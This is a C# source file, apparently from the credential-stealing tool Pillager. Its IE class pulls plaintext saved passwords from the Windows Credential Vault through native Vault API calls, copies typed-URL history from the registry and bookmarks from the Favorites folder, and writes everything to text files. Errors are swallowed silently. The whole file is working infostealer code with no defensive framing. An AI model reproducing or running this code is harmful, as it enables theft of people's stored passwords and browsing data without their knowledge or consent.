using Microsoft.Win32;
using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace Pillager.Browsers
{
    public class IE : ICommand
    {

        public string IE_passwords()
        {
            if (IntPtr.Size == 4)
            {
                Native.IsWow64Process(Native.GetCurrentProcess(), out var is64Bit);
                if (is64Bit)
                {
                    return "Don't support recovery IE password from wow64 process";
                }
            }
            StringBuilder sb = new StringBuilder();
            var OSVersion = Environment.OSVersion.Version;
            var OSMajor = OSVersion.Major;
            var OSMinor = OSVersion.Minor;

            Type VAULT_ITEM;

            if (OSMajor >= 6 && OSMinor >= 2)
            {
                VAULT_ITEM = typeof(Native.VAULT_ITEM_WIN8);
            }
            else
            {
                VAULT_ITEM = typeof(Native.VAULT_ITEM_WIN7);
            }

            /* Helper function to extract the ItemValue field from a VAULT_ITEM_ELEMENT struct */
            object GetVaultElementValue(IntPtr vaultElementPtr)
            {
                object results;
                object partialElement = Marshal.PtrToStructure(vaultElementPtr, typeof(Native.VAULT_ITEM_ELEMENT));
                FieldInfo partialElementInfo = partialElement.GetType().GetField("Type");
                var partialElementType = partialElementInfo.GetValue(partialElement);

                IntPtr elementPtr = (IntPtr)(vaultElementPtr.ToInt64() + 16);
                switch ((int)partialElementType)
                {
                    case 7: // VAULT_ELEMENT_TYPE == String; These are the plaintext passwords!
                        IntPtr StringPtr = Marshal.ReadIntPtr(elementPtr);
                        results = Marshal.PtrToStringUni(StringPtr);
                        break;
                    case 0: // VAULT_ELEMENT_TYPE == bool
                        results = Marshal.ReadByte(elementPtr);
                        results = (bool)results;
                        break;
                    case 1: // VAULT_ELEMENT_TYPE == Short
                        results = Marshal.ReadInt16(elementPtr);
                        break;
                    case 2: // VAULT_ELEMENT_TYPE == Unsigned Short
                        results = Marshal.ReadInt16(elementPtr);
                        break;
                    case 3: // VAULT_ELEMENT_TYPE == Int
                        results = Marshal.ReadInt32(elementPtr);
                        break;
                    case 4: // VAULT_ELEMENT_TYPE == Unsigned Int
                        results = Marshal.ReadInt32(elementPtr);
                        break;
                    case 5: // VAULT_ELEMENT_TYPE == Double
                        results = Marshal.PtrToStructure(elementPtr, typeof(Double));
                        break;
                    case 6: // VAULT_ELEMENT_TYPE == GUID
                        results = Marshal.PtrToStructure(elementPtr, typeof(Guid));
                        break;
                    case 12: // VAULT_ELEMENT_TYPE == Sid
                        IntPtr sidPtr = Marshal.ReadIntPtr(elementPtr);
                        var sidObject = new System.Security.Principal.SecurityIdentifier(sidPtr);
                        results = sidObject.Value;
                        break;
                    default:
                        /* Several VAULT_ELEMENT_TYPES are currently unimplemented according to
                         * Lord Graeber. Thus we do not implement them. */
                        results = null;
                        break;
                }
                return results;
            }
            /* End helper function */

            Int32 vaultCount = 0;
            IntPtr vaultGuidPtr = IntPtr.Zero;
            var result = Native.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuidPtr);

            if (result != 0)
            {
                throw new Exception("[ERROR] Unable to enumerate vaults. Error (0x" + result.ToString() + ")");
            }

            // Create dictionary to translate Guids to human readable elements
            IntPtr guidAddress = vaultGuidPtr;
            Dictionary<Guid, string> vaultSchema = new Dictionary<Guid, string>
            {
                { new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note" },
                { new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential" },
                { new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector" },
                { new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials" },
                { new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials" },
                { new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential" },
                { new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential" },
                { new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential" },
                { new Guid("00000000-0000-0000-0000-000000000000"), null }
            };

            for (int i = 0; i < vaultCount; i++)
            {
                // Open vault block
                object vaultGuidString = Marshal.PtrToStructure(guidAddress, typeof(Guid));
                Guid vaultGuid = new Guid(vaultGuidString.ToString());
                guidAddress = (IntPtr)(guidAddress.ToInt64() + Marshal.SizeOf(typeof(Guid)));
                IntPtr vaultHandle = IntPtr.Zero;
                string vaultType;
                vaultType = vaultSchema.ContainsKey(vaultGuid) ? vaultSchema[vaultGuid] : vaultGuid.ToString();
                result = Native.VaultOpenVault(ref vaultGuid, 0, ref vaultHandle);
                if (result != 0)
                {
                    throw new Exception("Unable to open the following vault: " + vaultType + ". Error: 0x" + result.ToString());
                }
                // Vault opened successfully! Continue.

                // Fetch all items within Vault
                int vaultItemCount = 0;
                IntPtr vaultItemPtr = IntPtr.Zero;
                result = Native.VaultEnumerateItems(vaultHandle, 512, ref vaultItemCount, ref vaultItemPtr);
                if (result != 0)
                {
                    throw new Exception("[ERROR] Unable to enumerate vault items from the following vault: " + vaultType + ". Error 0x" + result.ToString());
                }
                var structAddress = vaultItemPtr;
                if (vaultItemCount > 0)
                {
                    // For each vault item...
                    for (int j = 1; j <= vaultItemCount; j++)
                    {
                        // Begin fetching vault item...
                        var currentItem = Marshal.PtrToStructure(structAddress, VAULT_ITEM);
                        structAddress = (IntPtr)(structAddress.ToInt64() + Marshal.SizeOf(VAULT_ITEM));

                        IntPtr passwordVaultItem = IntPtr.Zero;
                        // Field Info retrieval
                        FieldInfo schemaIdInfo = currentItem.GetType().GetField("SchemaId");
                        Guid schemaId = new Guid(schemaIdInfo.GetValue(currentItem).ToString());
                        FieldInfo pResourceElementInfo = currentItem.GetType().GetField("pResourceElement");
                        IntPtr pResourceElement = (IntPtr)pResourceElementInfo.GetValue(currentItem);
                        FieldInfo pIdentityElementInfo = currentItem.GetType().GetField("pIdentityElement");
                        IntPtr pIdentityElement = (IntPtr)pIdentityElementInfo.GetValue(currentItem);
                        FieldInfo dateTimeInfo = currentItem.GetType().GetField("LastModified");
                        UInt64 lastModified = (UInt64)dateTimeInfo.GetValue(currentItem);

                        IntPtr pPackageSid = IntPtr.Zero;
                        if (OSMajor >= 6 && OSMinor >= 2)
                        {
                            // Newer versions have package sid
                            FieldInfo pPackageSidInfo = currentItem.GetType().GetField("pPackageSid");
                            pPackageSid = (IntPtr)pPackageSidInfo.GetValue(currentItem);
                            result = Native.VaultGetItem_WIN8(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, pPackageSid, IntPtr.Zero, 0, ref passwordVaultItem);
                        }
                        else
                        {
                            result = Native.VaultGetItem_WIN7(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, IntPtr.Zero, 0, ref passwordVaultItem);
                        }

                        if (result != 0)
                        {
                            throw new Exception("Error occured while retrieving vault item. Error: 0x" + result.ToString());
                        }
                        object passwordItem = Marshal.PtrToStructure(passwordVaultItem, VAULT_ITEM);
                        FieldInfo pAuthenticatorElementInfo = passwordItem.GetType().GetField("pAuthenticatorElement");
                        IntPtr pAuthenticatorElement = (IntPtr)pAuthenticatorElementInfo.GetValue(passwordItem);
                        // Fetch the credential from the authenticator element
                        object cred = GetVaultElementValue(pAuthenticatorElement);
                        object packageSid = null;
                        if (pPackageSid != IntPtr.Zero)
                        {
                            packageSid = GetVaultElementValue(pPackageSid);
                        }
                        if (cred != null) // Indicates successful fetch
                        {
                            sb.AppendLine("Vault Type   : {"+ vaultType + "}");
                            object resource = GetVaultElementValue(pResourceElement);
                            if (resource != null)
                            {
                                sb.AppendLine("Vault Type   : {" + resource + "}");
                            }
                            object identity = GetVaultElementValue(pIdentityElement);
                            if (identity != null)
                            {
                                sb.AppendLine("Vault Type   : {" + identity + "}");
                            }
                            if (packageSid != null)
                            {
                                sb.AppendLine("Vault Type   : {" + packageSid + "}");
                            }
                            sb.AppendLine("Vault Type   : {" + cred + "}");
                            // Stupid datetime
                            sb.AppendLine("LastModified : {"+ DateTime.FromFileTimeUtc((long)lastModified) + "}");
                            sb.AppendLine();
                        }
                    }
                }
            }

            return sb.ToString();
        }

        public string IE_history() 
        {
            StringBuilder sb = new StringBuilder();
            RegistryKey myreg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\TypedURLs");
            string[] urls = new string[26];

            for (int i = 1; i < 26; i++)
            {
                try
                {
                    urls[i] = myreg.GetValue("url" + i.ToString())?.ToString();
                }
                catch { }
            }
            foreach (string url in urls)
            {
                if (url != null)
                {
                    sb.AppendLine(url);
                }
            }
            return sb.ToString();
        }

        public string IE_books()
        {
            StringBuilder sb = new StringBuilder();
            string book_path = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);

            string[] files = Directory.GetFiles(book_path, "*.url", SearchOption.AllDirectories);

            foreach (string url_file_path in files)
            {
                if (File.Exists(url_file_path))
                {
                    string booktext = File.ReadAllText(url_file_path);
                    Match match = Regex.Match(booktext, @"URL=(.*?)\n");
                    sb.AppendLine($"{url_file_path}");
                    sb.AppendLine($"\t{match.Value}");
                }
            }

            return sb.ToString();
        }

        public override void Save(string path)
        {
            try
            {
                string savepath = Path.Combine(path, "IE");
                Directory.CreateDirectory(savepath);
                string passwords = IE_passwords();
                string books = IE_books();
                string history = IE_history();
                if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, "IE_passwords.txt"), passwords, Encoding.UTF8);
                if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, "IE_books.txt"), books, Encoding.UTF8);
                if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, "IE_history.txt"), history, Encoding.UTF8);
            }
            catch { }
        }
    }
}